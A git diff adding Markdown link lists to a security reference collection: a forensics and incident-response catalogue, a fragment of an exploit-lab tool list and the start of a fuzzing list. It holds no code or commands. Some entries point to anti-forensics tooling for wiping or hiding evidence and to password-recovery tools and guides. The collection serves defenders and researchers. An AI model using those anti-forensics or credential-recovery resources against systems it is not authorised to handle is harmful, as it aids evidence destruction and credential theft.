+6. Python27 (for ImmunityDebugger)+pyDbg
+7. lcc-win
+8. Wireshark
+9. Mantra on Chrome (MoC)
+10. Google-Chrome
+11. Microsoft Visual C++ 2008 Express
+12. Nasm
+13. metasploit
+14. Alpha3 (c:\Alpha3)
+15. IDA
+16. Sysinternals (c:\Windows\System32)
+17. Proxifier Edition
+18. Echo Mirage
+```
diff --git a/source/Forensics-Incident-Response.md b/source/Forensics-Incident-Response.md
new file mode 100644
index 0000000..1917b94
--- /dev/null
+++ b/source/Forensics-Incident-Response.md
@@ -0,0 +1,602 @@
+##Forensics & Incident Response
+
+###TOC
+
+* General
+* Tools
+* [Presentations/Talks](#talks)
+* [Anti-Forensics](#anti)
+* [Mobile Device Forensics](#mobile)
+  * [Android](#android)
+  * [iOS](#ios)
+  * [Blackberry](#bb)
+* [PDF Forensics](#pdf)
+* [Photo Forensics](#photo)
+* [Tools](#tools)
+* [OS Forensics](#os)
+  * [Linux Forensics](#linux)
+  * [OS X Forensics](#osx)
+  * [Windows Forensics](#windows)
+
+#### CULL
+
+* https://forensiccontrol.com/resources/free-software/
+* Forensics wiki
+* [dotNET_WinDBG](https://github.com/Cisco-Talos/dotNET_WinDBG)
+
+  * This python script is designed to automate .NET analysis with WinDBG. It can
+    be used to analyse a PowerShell script or to unpack a binary packed using a
+    .NET packer.
+
+* [Unravelling .NET with the Help of WinDBG - TALOS](http://blog.talosintelligence.com/2017/07/unravelling-net-with-help-of-windbg.html)
+
+  * How to analyse PowerShell scripts by inserting a breakpoint in the .NET API.
+  * How to easily create a script to automatically unpack .NET samples following
+    analysis of the packer logic.
+
+### Sniper Forensics
+
+* http://windowsir.blogspot.com/2013/11/sniper-forensics-memory-analysis-and.html
+* [Malware Management Framework - Sniper Forensics Toolkit](http://sniperforensicstoolkit.squarespace.com/malwaremanagementframework/)
+* [The Malware Management Framework](https://malwarearchaeology.squarespace.com/mmf/)
+
+  * [The Malware Reporting Standard](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/55220280e4b0170ec8b526b6/1428292224531/Malware+Reporting+Standard+vApril+2015.pdf)
+  * [BSidesLV Presentation](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/552200afe4b0e4ad5008b943/1428291802554/Malware+Mgmt+Framework+v2.0.pdf)
+
+* [Sniper Forensics](https://digital-forensics.sans.org/summit-archives/2010/2-newell-spiderlabs-sniper-forensics.pdf)
+
+  * Pg10 and onward
+  * [Link](https://sniperforensicstoolkit.squarespace.com/storage/logging/Windows%20Logging%20Cheat%20Sheet%20v1.1.pdf)
+
+### General
+
+* Better security -> Mean time to detect/Mean time to respond
+* [IRM (Incident Response Methodologies)](https://github.com/certsocietegenerale/IRM)
+
+  * CERT Societe Generale provides easy to use operational incident best
+    practices. These cheat sheets are dedicated to incident handling and cover
+    multiple fields in which a CERT team can be involved. One IRM exists for
+    each security incident we're used to dealing with.
+
+* [Introduction to DFIR](https://sroberts.github.io/2016/01/11/introduction-to-dfir-the-beginning/)
+* [File Signature Table](http://www.garykessler.net/library/file_sigs.html)
+
+  * This table of file signatures (aka "magic numbers") is a continuing
+    work-in-progress. I have found little information on this in a single place,
+    with the exception of the table in Forensic Computing: A Practitioner's
+    Guide by T. Sammes & B. Jenkinson (Springer, 2000); that was my inspiration
+    to start this list in 2002. See also Wikipedia's List of file signatures.
+    Comments, additions, and queries can be sent to Gary Kessler at
+    gck@garykessler.net.
+
+* [IRMA - Incident Response & Malware Analysis](http://irma.quarkslab.com/index.html)
+
+  * IRMA intends to be an open-source platform designed to help identifying and
+    analyzing malicious files. However, today's defense is not only about
+    learning about a file, but it is also getting a fine overview of the
+    incident you dealt with: where / when a malicious file has been seen, who
+    submitted a hash, where a hash has been noticed, which anti-virus detects
+    it, ... An important value with IRMA comes from you keep control over where
+    goes / who gets your data. Once you install IRMA on your network, your data
+    stays on your network. Each submitted files is analyzed in various ways. For
+    now, we focus our efforts on multiple anti-virus engines, but we are working
+    on other "probes" (feel free to submit your own).
+
+* [No Easy Breach: Challenges and Lessons Learned from an Epic Investigation](https://archive.org/details/No_Easy_Breach#)
+* [Forensics on Amazon’s EC2](https://sysforensics.org/2014/10/forensics-in-the-amazon-cloud-ec2.html)
+* [Attrition Forensics](http://2014.video.sector.ca/video/110334184)
+* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
+
+### Writeups
+
+* [Handler Diaries - Another Hunting Post(DFIR)](http://blog.handlerdiaries.com/?p=775)
+
+  * Good post on not only knowing the layout, but knowing expected behaviours.
+
+* [Automating DFIR - How to series on programming libtsk with python Part 3](http://www.hecfblog.com/2015/02/automating-dfir-how-to-series-on_21.html)
+* [Happy DPAPI!](http://blog.digital-forensics.it/2015/01/happy-dpapi.html)
+
+#### Hacking Exposed - Automating DFIR Series
+
+* [Automating DFIR - How to series on programming libtsk with python Part 1 - ](http://hackingexposedcomputerforensicsblog.blogspot.com/2015/02/automating-dfir-how-to-series-on.html)
+* [Automating DFIR - How to series on programming libtsk with python Part 2](http://hackingexposedcomputerforensicsblog.blogspot.com/2015/02/automating-dfir-how-to-series-on_19.html)
+* [Automating DFIR - How to series on programming libtsk with python Part 3](http://hackingexposedcomputerforensicsblog.blogspot.com/)
+* [THE CIDER PRESS:EXTRACTING FORENSIC ARTIFACTS FROM APPLE CONTINUITY](https://www.sans.org/summit-archives/file/summit-archive-1498146226.pdf)
+
+### Tools
+
+* [MIG: Mozilla InvestiGator](https://http://mig.mozilla.org/)
+
+  * Mozilla's real-time digital forensics and investigation platform.
+
+* [SSDeep](http://ssdeep.sourceforge.net/)
+
+  * ssdeep is a program for computing context triggered piecewise hashes (CTPH).
+    Also called fuzzy hashes, CTPH can match inputs that have homologies. Such
+    inputs have sequences of identical bytes in the same order, although bytes
+    in between these sequences may be different in both content and length.
+
+* [binwally](https://github.com/bmaia/binwally)
+
+  * Binary and Directory tree comparison tool using the Fuzzy Hashing concept
+    (ssdeep)
+
+* [PDF Tools - Didier Stevens](http://blog.didierstevens.com/programs/pdf-tools/)
+* [Xmount](https://www.pinguin.lu/xmount)
+
+  * What is xmount? xmount allows you to convert on-the-fly between multiple
+    input and output harddisk image types. xmount creates a virtual file system
+    using FUSE (Filesystem in Userspace) that contains a virtual representation
+    of the input image. The virtual representation can be in raw DD, DMG, VHD,
+    VirtualBox's virtual disk file format or in VmWare's VMDK file format. Input
+    images can be raw DD, EWF (Expert Witness Compression Format) or AFF
+    (Advanced Forensic Format) files. In addition, xmount also supports virtual
+    write access to the output files that is redirected to a cache file. This
+    makes it possible to boot acquired harddisk images using QEMU, KVM,
+    VirtualBox, VmWare or alike.
+
+* [Extensible Metadata Platform](https://en.wikipedia.org/wiki/Extensible_Metadata_Platform)
+
+  * The Extensible Metadata Platform (XMP) is an ISO standard, originally
+    created by Adobe Systems Inc., for the creation, processing and interchange
+    of standardized and custom metadata for digital documents and data sets.
+
+* [PEview](http://wjradburn.com/software/)
+
+  * PEview provides a quick and easy way to view the structure and content of
+    32-bit Portable Executable (PE) and Component Object File Format (COFF)
+    files. This PE/COFF file viewer displays header, section, directory, import
+    table, export table, and resource information within EXE, DLL, OBJ, LIB,
+    DBG, and other file types.
+
+* [firepwd.py](https://github.com/lclevy/firepwd)
+
+  * firepwd.py, an open source tool to decrypt Mozilla protected passwords
+
+* [osxcollector](https://github.com/Yelp/osxcollector)
+
+  * OSXCollector is a forensic evidence collection & analysis toolkit for OSX.
+
+* [Jeffrey's Image Metadata Viewer](http://exif.regex.info/exif.cgi)
+
+### Firmware
+
+* [Firmware Forensics: Diffs, Timelines, ELFs and Backdoors](http://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html)
+
+### Bitlocker
+
+* [NVbit : Accessing Bitlocker volumes from linux](http://www.nvlabs.in/index.php?/archives/1-NVbit-Accessing-Bitlocker-volumes-from-linux.html)
+
+### IR
+
+* [Rapier](https://code.google.com/p/rapier/)
+
+  * RAPIER is a security tool built to facilitate first response procedures for
+    incident handling. It is designed to acquire commonly requested information
+    and samples during an information security event, incident, or
+    investigation. RAPIER automates the entire process of data collection and
+    delivers the results directly to the hands of a skilled security analyst
+
+* [triage-ir](https://code.google.com/p/triage-ir/)
+
+  * Triage: Incident Response automatically collect information from a system
+    that needs basic triage functions performed upon it. The script allows for
+    easy modification for customization to your needs, in an easy to comprehend
+    and implement language. This tool uses a lot others to get its information.
+    Eventually I hope to eliminate the need for them, but use them as
+    verification. This tool requires you to download the Sysinternals Suite if
+    you want full functionality to it.
+
+* [Fully Integrated Defense Operation (FIDO)](https://github.com/Netflix/Fido)
+
+  * FIDO is an orchestration layer used to automate the incident response
+    process by evaluating, assessing and responding to malware. FIDO’s primary
+    purpose is to handle the heavy manual effort needed to evaluate threats
+    coming from today's security stack and the large number of alerts generated
+    by them. As an orchestration platform FIDO can make using your existing
+    security tools more efficient and accurate by heavily reducing the manual
+    effort needed to detect, notify and respond to attacks against a network.
+
+* [Triaging Malware Incidents](http://journeyintoir.blogspot.com/2013/09/triaging-malware-incidents.html)
+
+  * Good writeup/blogpost from Journey into Incidence Response
+
+* [Computer Security Incident Handling Guide - NIST](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
+* [An Incident Handling Process for Small and Medium Businesses - SANS 2007](https://www.sans.org/reading-room/whitepapers/incident/incident-handling-process-small-medium-businesses-1791)
+* [PowerForensics - PowerShell Digital Forensics](https://github.com/Invoke-IR/PowerForensics)
+
+  * The purpose of PowerForensics is to provide an all inclusive framework for
+    hard drive forensic analysis. PowerForensics currently supports NTFS and FAT
+    file systems, and work has begun on Extended File System and HFS+ support.
+
+* [Invoke-IR](http://www.invoke-ir.com/)
+* [Practical Comprehensive Bounds on Surreptitious Communication Over DNS](http://www.icir.org/vern/papers/covert-dns-usec13.pdf)
+
+### IOC
+
+* [IOC Bucket](https://www.iocbucket.com/)
+
+  * IOC sharing platform
+
+### Browser Forensics
+
+* [Firefox private browsing forensics](http://www.magnetforensics.com/forensic-implications-of-a-person-using-firefoxs-private-browsing/)
+* [MozillaRecovery](https://github.com/gtfy/MozillaRecovery)
+
+  * Recovers the master password of key3.db files, i.e. Thunderbird, Firefox
+
+* [Google Chrome Forensics-SANS](https://digital-forensics.sans.org/blog/2010/01/21/google-chrome-forensics#)
+* [Extension Finder](https://github.com/brad-anton/extension_finder)
+
+  * Python and PowerShell utilities for finding installed browser extensions,
+    plug-ins and add-ons. Attempts to find installed browser extensions
+    (sometimes called add-ons or plug-ins, depending on the browser).
+
+* [MozillaRecovery](https://github.com/gtfy/MozillaRecovery)
+
+  * Recovers the master password of key3.db files, i.e. Thunderbird, Firefox
+
+### Memory Forensics
+
+* [Detekt](https://github.com/botherder/detekt)
+
+  * Detekt is a Python tool that relies on Yara, Volatility and Winpmem to scan
+    the memory of a running Windows system (currently supporting Windows XP to
+    Windows 8 both 32 and 64 bit and Windows 8.1 32bit). Detekt tries to detect
+    the presence of pre-defined patterns that have been identified through the
+    course of our research to be unique identifiers that indicate the presence
+    of a given malware running on the computer.
+
+* [Dshell](https://github.com/USArmyResearchLab/Dshell)
+
+  * An extensible network forensic analysis framework. Enables rapid development
+    of plugins to support the dissection of network packet captures.
+
+* [Mem forenics cheat sheet](http://forensicmethods.com/wp-content/uploads/2012/04/Memory-Forensics-Cheat-Sheet-v1.pdf)
+* [LiME - Linux Memory Extractor](https://github.com/504ensicsLabs/LiME)
+
+  * A Loadable Kernel Module (LKM) which allows for volatile memory acquisition
+    from Linux and Linux-based devices, such as Android. This makes LiME unique
+    as it is the first tool that allows for full memory captures on Android
+    devices. It also minimizes its interaction between user and kernel space
+    processes during acquisition, which allows it to produce memory captures
+    that are more forensically sound than those of other tools designed for
+    Linux memory acquisition.
+
+* [Volatility](https://github.com/volatilityfoundation/volatility)
+
+  * An advanced memory forensics framework
+
+* [evolve](https://github.com/JamesHabben/evolve)
+
+  * Web interface for the Volatility Memory Forensics Framework
+
+* [How to Pull passwords from a memory dump](https://cyberarms.wordpress.com/2011/11/04/memory-forensics-how-to-pull-passwords-from-a-memory-dump/)
+* [Unmasking Careto through Memory Analysis - Andrew Case](http://2014.video.sector.ca/video/110388398)
+* [Windows Memory Analysis Checklist](http://www.dumpanalysis.org/windows-memory-analysis-checklist)
+
+### Training material
+
+* [ENISA CERT Exercises and Training](http://www.enisa.europa.eu/activities/cert/support/exercise)
+
+  * ENISA CERT Exercises and training material was introduced in 2008, in 2012
+    and 2013 it was complemented with new exercise scenarios containing
+    essential material for success in the CERT community and in the field of
+    information security. In this page you will find the ENISA CERT Exercise
+    material, containing Handbook for teachers, Toolset for students and Virtual
+    Image to support hands on training sessions.
+
+* [Packet Capture Examples from "Practical Packet Analysis"](http://www.chrissanders.org/captures/)
+
+### Presentations & Talks
+
+* [Forensic Imager Tools: You don't have the Evidence - Shmoocon 2014](https://www.youtube.com/watch?v=zYYCv21I-1I)\*
+* [Ways to Identify Malware on a System Ryan Irving](http://www.irongeek.com/i.php?page=videos/bsidestampa2015/201-ways-to-identify-malware-on-a-system-ryan-irving)
+* [Investigating PowerShell Attacks - Ryan Kazanciyan and Matt Hastings - DEFCON22](https://www.youtube.com/watch?v=qF06PFcezLs)
+
+  * This presentation will focus on common attack patterns performed through
+    PowerShell - such as lateral movement, remote command execution,
+    reconnaissance, file transfer, etc. - and the sources of evidence they leave
+    behind. We'll demonstrate how to collect and interpret these forensic
+    artifacts, both on individual hosts and at scale across the enterprise.
+    Throughout the presentation, we'll include examples from real-world
+    incidents and recommendations on how to limit exposure to these attacks.
+
+* [Human Hunting](http://www.irongeek.com/i.php?page=videos/bsidessf2015/108-human-hunting-sean-gillespie)
+
+  * Much of what appears to be happening in information security seems to be
+    focused on replacing humans with magic boxes and automation rather than
+    providing tools to augment human capabilities. However, when we look at good
+    physical security we see technology is being used to augment human
+    capabilities rather than simply replace them. The adversary is human so we
+    are ultimately looking for human directed behaviors. If analysts don't know
+    how to go looking for evil without automated detection tools then they are
+    not going to be able to effectively evaluate if the detection tools are
+    working properly or if the deployment was properly engineered. An over
+    reliance on automated detection also puts organizations in a position of
+    paying protection money if they want to remain secure. We should be spending
+    more resources on honing analyst hunting skills to find human adversaries
+    rather than purchasing more automated defenses for human adversaries to
+    bypass.
+
+* [Finding Bad Guys with 35 million Flows, 2 Analysts, 5 Minutes and 0 Dollars](http://www.irongeek.com/i.php?page=videos/bsidesknoxville2015/103-finding-bad-guys-with-35-million-flows-2-analysts-5-minutes-and-0-dollars-russell-butturini)
+
+  * There are a lot of proof of concepts out there for building open source
+    networks forensics analysis environments. Taking them into production in an
+    enterprise? Another story entirely. This talk will focus on my journey into
+    constructing a large scale Netflow security analytics platform for a large
+    healthcare management company's complex environment on no additional budget.
+    Important points to be covered were technology considerations, scalability,
+    and how to quickly break the collected data down to find malicious activity
+    on the network with minimal effort.
+
+* [Fraud detection and forensics on telco networks - Hack.lu 2016](https://www.youtube.com/watch?v=09EAWT_F1ZA&app=desktop)
+* [Commercial Spyware - Detecting the Undetectable](https://www.blackhat.com/docs/us-15/materials/us-15-Dalman-Commercial-Spyware-Detecting-The-Undetectable-wp.pdf)
+
+### Anti-Forensics
+
+* [Destroying Evidence Before Its Evidence](https://www.youtube.com/watch?v=lqBVAcxpwio&spfreload=1)
+* [And That's How I Lost My Other Eye...Explorations in Data Destruction](https://www.youtube.com/watch?v=-bpX8YvNg6Y)
+* [Secure Deletion of Data from Magnetic and Solid-State Memory](http://static.usenix.org/publications/library/proceedings/sec96/full_papers/gutmann/index.html)
+* [usbkill](https://github.com/stemid/usbkill)
+
+  * A tool that shuts down your computer if USB devices change, for example if
+    you unplug or plug-in a device.
+
+* [An Anti-Forensics Primer - Jason Andress](http://www.irongeek.com/i.php?page=videos/derbycon3/s216-an-anti-forensics-primer-jason-andress)
+
+  * This talk will cover the basics of anti-forensics, the tools and techniques
+    that can be used to make life harder for computer forensic examiners. We
+    will cover some of the basic methods that are used (disk wiping, time
+    stomping, encryption, etc…) and talk about which of these methods might
+    actually work and which are easily surmounted with common forensic tools.
+
+* [OpenPuff Steganography](http://embeddedsw.net/OpenPuff_Steganography_Home.html)
+* [Forensics Impossible: Self-Destructing Thumb Drives - Brandon Wilson](https://www.youtube.com/watch?v=NRMqwc5YEu4)
+* [CleanAfterMe](https://www.nirsoft.net/utils/clean_after_me.html)
+
+  * CleanAfterMe allows you to easily clean files and Registry entries that are
+    automatically created by the Windows operating system during your regular
+    computer work. With CleanAfterMe, you can clean the
+    cookies/history/cache/passwords of Internet Explorer, the 'Recent' folder,
+    the Registry entries that record the last opened files, the temporary folder
+    of Windows, the event logs, the Recycle Bin, and more.| http://
+
+* [Hiding Data in Hard-Drive's Service Areas](http://recover.co.il/SA-cover/SA-cover.pdf)
+
+  * In this paper we will demonstrate how spinning hard-drives’ serv ice areas 1
+    can be used to hide data from the operating-system (or any software using
+    the standard OS’s API or the standard ATA commands to access the hard-
+    drive)
+
+* [Anti-Forensics and Anti-Anti-Forensics Attacks - Michael Perkins](https://www.youtube.com/watch?v=J4x8Hz6_hq0)
+
+  * Everyone's heard the claim: Security through obscurity is no security at
+    all. Challenging this claim is the entire field of steganography itself -
+    the art of hiding things in plain sight. Most people know you can hide a
+    text file inside a photograph, or embed a photograph inside an MP3. But how
+    does this work under the hood? What's new in the stego field? This talk will
+    explore how various techniques employed by older steganographic tools work
+    and will discuss a new technique developed by the speaker which embodies
+    both data hiding and data enciphering properties by encoding data inside
+    NTFS volumes. A new tool will be released during this talk that will allow
+    attendees to both encode and decode data with this new scheme.
+  * Slides:
+    [Slides(link)](http://www.slideshare.net/the_netlocksmith/defcon-20-antiforensics-and-antiantiforensics)
+
+* [Beyond The CPU:Defeating Hardware Based RAM Acquisition](https://www.blackhat.com/presentations/bh-dc-07/Rutkowska/Presentation/bh-dc-07-Rutkowska-up.pdf)
+* [Hardware Backdooring is Practical\** -Jonathan Brossard](https://www.youtube.com/watch?v=umBruM-wFUw)
+* [Hiding the breadcrumbs: Forensics and anti-forensics on SAP systems - Juan Perez-Etchegoyen](http://www.irongeek.com/i.php?page=videos/derbycon4/t508-hiding-the-breadcrumbs-forensics-and-anti-forensics-on-sap-systems-juan-perez-etchegoyen)
+
+  * The largest organizations in the world rely on SAP platforms to run their
+    critical processes and keep their business crown jewels: financial
+    information, customer data, intellectual property, credit cards, human
+    resources salaries, sensitive materials, suppliers and more. Everything is
+    there and attackers know it. For several years at Onapsis we have been
+    researching on how cyber-criminals might be able to break into ERP systems
+    in order to help organizations better protect themselves. This has enabled
+    us to gain a unique expertise on which are the most critical attack vectors
+    and what kind of traces they leave (and don’t) over the victim’s SAP
+    platforms. SAP systems need to be ready for Forensic Analysis, so the big
+    question is: Are your systems prepared to retain the attackers breadcrumbs
+    in the event of an attack? Join us and learn how to do a forensic analysis
+    of an SAP system, looking for traces of a security breach We will also show
+    novel techniques being used by attackers to avoid being detected during post
+    attack forensic investigations. Vulnerabilities related to anti-forensic
+    techniques will be presented together with their mitigation. **NEW** New
+    attacks never presented before will be shown. JAVA, ABAP and BO systems will
+    be covered.
+
+* [int0x80 (of Dual Core) -- Anti-Forensics for the Louise - Derbycon](https://www.youtube.com/watch?v=-HK1JHR7LIM)
+
+### Mobile Device Forensics
+
+### Android Forensics
+
+* [Android Forensics class - OpenSecurity Training](http://opensecuritytraining.info/AndroidForensics.html)
+
+  * This class serves as a foundation for mobile digital forensics, forensics of
+    Android operating systems, and penetration testing of Android applications.
+
+* [Androick](https://github.com/Flo354/Androick)
+
+  * Androick is a python tool to help in forensics analysis on android. Put the
+    package name, some options and the program will download automatically apk,
+    datas, files permissions, manifest, databases and logs. It is easy to use
+    and avoid all repetitive tasks!
+
+### iOS Forensics
+
+* http://www.forensicswiki.org/wiki/Apple_iPhone
+
+* http://www.iosresearch.org/
+* [iOSForensic](https://github.com/Flo354/iOSForensic)
+
+  * iosForensic is a python tool to help in forensics analysis on iOS. It get
+    files, logs, extract sqlite3 databases and uncompress .plist files in xml.
+
+* [iOS Forensics Analyis(2012) SANS Whitepaper](https://www.sans.org/reading-room/whitepapers/forensics/forensic-analysis-ios-devices-34092)
+* [iOS Forensic Investigative Methods Guide](http://www.zdziarski.com/blog/wp-content/uploads/2013/05/iOS-Forensic-Investigative-Methods.pdf)
+* [The art of iOS and iCloud forensics](https://blog.elcomsoft.com/2017/11/the-art-of-ios-and-icloud-forensics/)
+
+### PDF Forensics
+
+* http://countuponsecurity.com/2014/09/22/malicious-documents-pdf-analysis-in-5-steps/
+* [Didier Stevens Blog](https://blog.didierstevens.com/)
+* [PDF Forensics](http://countuponsecurity.com/2014/09/22/malicious-documents-pdf-analysis-in-5-steps/)
+
+### Photo Forensics
+
+* [jhead](http://www.sentex.net/~mwandel/jhead/)
+
+  * Exif Jpeg header manipulation tool
+
+### Tools:
+
+* Ghiro
+* [StegExpose](https://github.com/b3dk7/StegExpose)
+
+  * StegExpose is a steganalysis tool specialized in detecting LSB (least
+    significant bit) steganography in lossless images such as PNG and BMP. It
+    has a command line interface and is designed to analyse images in bulk while
+    providing reporting capabilities and customization which is comprehensible
+    for non forensic experts. StegExpose rating algorithm is derived from an
+    intelligent and thoroughly tested combination of pre-existing pixel based
+    staganalysis methods including Sample Pairs by Dumitrescu (2003), RS
+    Analysis by Fridrich (2001), Chi Square Attack by Westfeld (2000) and
+    Primary Sets by Dumitrescu (2002). In addition to detecting the presence of
+    steganography, StegExpose also features the quantitative steganalysis
+    (determining the length of the hidden message). StegExpose is part of my MSc
+    of a project at the School of Computing of the University of Kent, in
+    Canterbury, UK.
+
+### Linux Forensics
+
+* [Santoku Linux How-Tos'](https://santoku-linux.com/howtos)
+
+### Windows Forensics
+
+* [SANS CHEAT SHEET- Windows Artifact Analysis](https://uk.sans.org/posters/windows_artifact_analysis.pdf)
+* [How to parse Windows Eventlog](http://dfir-blog.com/2016/03/13/how-to-parse-windows-eventlog/)
+* [Know your Windows' Processes](https://sysforensics.org/2014/01/know-your-windows-processes.html)
+
+#### Windows Forensics Tools
+
+* [NTDSXtract - Active Directory Forensics Framework](http://www.ntdsxtract.com/)
+
+  * Description from the page: This framework was developed by the author in
+    order to provide the community with a solution to extract forensically
+    important information from the main database of Microsoft Active Directory
+    (NTDS.DIT).
+
+* [Did it Execute? - Mandiant](https://www.mandiant.com/blog/execute/)
+
+  * You found a malicious executable! Now you’ve got a crucial question to
+    answer: did the file execute? We’ll discuss a few sources of evidence you
+    can use to answer this question. In this post, we will focus on static or
+    “dead drive” forensics on Windows systems. We will cover four main sources
+    of evidence: Windows Prefetch, Registry, Log Files, and File Information.
+
+* [Get-InjectedThread.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+
+  * Code from "Taking Hunting to the Next Level: Hunting in Memory" presentation
+    at SANS Threat Hunting Summit 2017 by Jared Atkinson and Joe Desimone
+
+* [HowTo: Determine Program Execution](http://windowsir.blogspot.com/2013/07/howto-determine-program-execution.html)
+* [Kansa -A Powershell incident response framework ](https://github.com/davehull/Kansa)
+
+  * A modular incident response framework in Powershell. Note there's a bug
+    that's currently cropping up in PowerShell version 2 systems, but version 3
+    and later should be fine
+
+* [License to Kill: Malware Hunting with the Sysinternals Tools](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
+* [Windows Program Automatic Startup Locations](http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)
+* [Collection of Windows Autostart locations](http://gladiator-antivirus.com/forum/index.php?showtopic=24610)
+* [Spotting the Adversary with Windows Event Log Monitoring - NSA](http://cryptome.org/2014/01/nsa-windows-event.pdf)
+
+  * NSA 70-page writeup on windows event log monitoring
+
+* [DPAPIck](http://dpapick.com/)
+
+  * This is a forensic tool to deal, in an offline way, with Microsoft Windows®
+    protected data, using the DPAPI (Data Protection API
+
+* [Techniques for fast windows forensics investigations](https://www.youtube.com/watch?v=eI4ceLgO_CE)
+
+  * Look at sniper forensics, skip around, 18min has resources you want to grab
+    for snapshots
+
+* [Know your Windows Processes or Die Trying](https://sysforensics.org/2014/01/know-your-windows-processes.html)
+
+  * Excellent quick reference on Windows proccesses with a focus on Win7. Good
+    resource.
+
+* [WinPrefetchView v1.25](http://www.nirsoft.net/utils/win_prefetch_view.html)
+
+  * Each time that you run an application in your system, a Prefetch file which
+    contains information about the files loaded by the application is created by
+    Windows operating system. The information in the Prefetch file is used for
+    optimizing the loading time of the application in the next time that you run
+    it. WinPrefetchView is a small utility that reads the Prefetch files stored
+    in your system and display the information stored in them. By looking in
+    these files, you can learn which files every application is using, and which
+    files are loaded on Windows boot.
+
+* [BTA - AD Security Audit Framework](https://bitbucket.org/iwseclabs/bta)
+
+  * BTA is an open-source Active Directory security audit framework. Its goal is
+    to help auditors harvest the information they need to answer such questions
+    as:
+    * Who has rights over a given object (computer, user account, etc.) ?
+    * Who can read a given mailbox ?
+    * Which are the accounts with domain admin rights ?
+    * Who has extended rights (userForceChangePassword, SendAs, etc.) ?
+    * What are the changes done on an AD between two points in time ?
+
+* [Claimsman]()
+
+  * Claimsman logs all file handle creation on Windows systems, and logs to both
+    a local file and centralized log management system.
+
+* [FastIR Collector](https://github.com/SekoiaLab/Fastir_Collector)
+
+  * This tool collects different artefacts on live Windows and records the
+    results in csv or json files. With the analyses of these artefacts, an early
+    compromission can be detected.
+
+* [FastIR Collector on advanced threats](http://www.sekoia.fr/blog/wp-content/uploads/2015/10/FastIR-Collector-on-advanced-threats_v1.4.pdf)
+* [Windows Attribute changer](http://www.petges.lu/home/)
+* [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
+
+  * "Event Tracing for Windows, (ETW), has been around for quite a while now as
+    it was introduced in Windows 2000. It's basically instrumented logging that
+    describes what a component is doing. Conceptually, it’s something like the
+    proverbial printf("here1") concept used by programmers, but it is present in
+    retail builds. When you enable logging in a component the result is an ETL
+    (Event Trace Log) file. What’s new is that that Network Monitor can read any
+    ETL file. And with the supplied parsers many network oriented ETW providers
+    can be decoded."
+
+* [PowerForensics - PowerShell Digital Forensics](https://github.com/Invoke-IR/PowerForensics)
+
+  * The purpose of PowerForensics is to provide an all inclusive framework for
+    hard drive forensic analysis. PowerForensics currently supports NTFS and FAT
+    file systems, and work has begun on Extended File System and HFS+ support.
+
+### OS X Forensics Tools
+
+* [OS X Audiotr](https://github.com/jipegit/OSXAuditor)
+
+  * OS X Auditor is a free Mac OS X computer forensics tool.
+
+* [OS X Forensics Generals](https://davidkoepi.wordpress.com/category/os-x-forensics-10-8/)
+* [OSX Lion User Interface Preservation Analysis](https://digital-forensics.sans.org/blog/2011/10/03/osx-lion-user-interface-preservation-analysis#)
+
+#### Bootkit Disk Forensics
+
+* [Part 1](http://www.malwaretech.com/2015/02/bootkit-disk-forensics-part-1.html)
+* [Part 2](http://www.malwaretech.com/2015/03/bootkit-disk-forensics-part-2.html)
+
+### Chrome Book Forensics
+
+* [Chromebook Forensics](http://www.dataforensics.org/google-chromebook-forensics/)
diff --git a/source/Fuzzing-Bug-Hunting.md b/source/Fuzzing-Bug-Hunting.md
new file mode 100644
index 0000000..e26e067
--- /dev/null
+++ b/source/Fuzzing-Bug-Hunting.md
@@ -0,0 +1,461 @@
+# Fuzzing
+
+TOC
+
+* [General](#general)
+* [Videos/Presentations](#videos)
+* [Techniques](#tech)
+* [Write-ups](#writeup)
+* [Training](#training)
+* [Tools](#tools)
+* [Papers](#papers)
+* [Presentations](#presen)
+* [Books](#books)
+* [Miscellaneous](#misc)
+
+### Sort
+
+* [Introduction to USB and Fuzzing DEFCON23 Matt DuHarte](https://www.youtube.com/watch?v=KWOTXypBt4E)
+* https://raw.githubusercontent.com/secfigo/Awesome-Fuzzing/master/README.md
+
+### To Do
+
+* Add Descriptions/generals to types of fuzzing
+
+### General
+
+* [Symbolic execution timeline](https://github.com/enzet/symbolic-execution)
+
+  * Diagram highlights some major tools and ideas of pure symbolic execution,
+    dynamic symbolic execution (concolic) as well as related ideas of model
+    checking, SAT/SMT solving, black-box fuzzing, taint data tracking, and other
+    dynamic analysis techniques.
+
+* [15 minute guide to fuzzing](https://www.mwrinfosecurity.com/our-thinking/15-minute-guide-to-fuzzing/)
+* [Fuzzing basics...how to break software - grid - Scott M](http://www.irongeek.com/i.php?page=videos/derbycon6/411-fuzzing-basicshow-to-break-software-grid-aka-scott-m)
+
+  * Ever wanted to break software? You know you want to...it's fun! In this
+    talk, I will share some tools & techniques I've used to improve software by
+    breaking it.
+
+* [Quick explanation of fuzzing and various fuzzers](http://whoisjoe.info/?p=16)
+* [Basic fuzzing framework](https://www.cert.org/vulnerability-analysis/tools/bff-download.cfm)
+* [Fuzzing 101 (Part 1)]()
+* [Fuzzing 101 (Part 2)](https://vimeo.com/5237484)
+* [Fuzzing workflows; a fuzz job from start to finish](https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/)
+* [Youtube Playlist of Fuzzing Videos](https://www.youtube.com/playlist?list=PLtPrYlwXDImiO_hzK7npBi4eKQQBgygLD)
+
+### Blogposts
+
+* [Fools of Golden Gate](https://blog.silentsignal.eu/2017/05/08/fools-of-golden-gate/)
+
+  * How major vulnerabilities/large amounts of publicly vulnerable systems can
+    exist without public recognition for long periods of time. (i.e. CVEs(10.0)
+    exist, but no mapping in nessus/metasploit/etc)
+
+### Techniques
+
+#### Taint Analysis
+
+* [Taint analysis and pattern matching with Pin - Jonathan Salwan](http://shell-storm.org/blog/Taint-analysis-and-pattern-matching-with-Pin/)
+
+#### Manual Source Code Analysis
+
